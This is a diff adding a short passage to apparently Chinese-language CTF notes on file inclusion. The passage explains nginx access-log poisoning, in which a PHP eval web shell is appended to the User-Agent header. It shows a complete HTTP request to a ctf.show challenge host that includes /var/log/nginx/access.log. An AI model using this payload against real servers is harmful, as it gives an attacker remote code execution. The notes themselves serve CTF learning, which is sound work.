@@ -83,6 +83,22 @@
 
 <br>
 
+* 日志文件包含：（抓包改UA，在UA末尾加东西）
+* 如：
+````
+GET /?file=/var/log/nginx/access.log HTTP/1.1
+Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
+Connection: close
+````
+
+
+<br>
 
 ````
 一般使用方法：
